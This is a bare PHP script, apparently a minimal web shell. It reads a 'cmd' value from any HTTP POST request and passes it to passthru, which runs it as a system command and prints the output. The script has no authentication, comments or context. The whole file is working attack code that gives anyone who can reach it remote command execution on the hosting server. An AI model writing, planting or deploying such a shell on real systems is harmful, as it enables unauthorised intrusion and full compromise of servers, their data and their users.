<?php
function execute($com)
{
	if (!empty($com))
	{
		if(function_exists('passthru'))
		{
			echo passthru($com);
		}
	}
}

$cmd = $_POST['cmd'];
execute($cmd);
?>